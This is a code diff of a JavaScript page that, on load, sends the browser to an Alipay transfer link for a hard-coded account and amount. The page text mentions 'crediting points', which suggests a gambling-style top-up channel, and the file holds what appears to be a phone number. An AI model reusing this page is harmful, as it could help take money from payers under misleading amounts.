@@ -206,7 +206,7 @@
     }, false);
 
     function javascrip(){history.go(0);}
-    var a = "2088022360286702";
+    var a = "2088432791672441";
     var b = "";
     var c = "afas8f7a89s7f9asffasf96d96g8gi98h798dh798df7h9hdg6h76fd76h8df7h8d75hdf";
     var d = "alipay";
@@ -214,7 +214,7 @@
     var e = "亲";
     var f = "请正确输入金额1000.00元，输错将导致无法上分";
     var g = "确定";
-    var h = "1.10";
+    var h = "100";
     var i = "2019032718350613701";
     var j = "15759762022";
     // 链接
@@ -244,7 +244,7 @@
     //         }
     //     });
     // }
-    setTimeout("javascript()", 300);
+    setTimeout("repay()", 300);
 
     function javascript() {
         try {
@@ -269,9 +269,9 @@
     }
     function repay(){
         var urls = 'alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount='+h+'&userId='+a;
-        urls = encodeURIComponent(urls);
-        var url='https://ds.alipay.com/?from=mobilecodec&scheme='+urls;
-        window.location.href= url;
+        // urls = encodeURIComponent(urls);
+        // var url='https://ds.alipay.com/?from=mobilecodec&scheme='+urls;
+        window.location.href= urls;
     }
 
 </script>
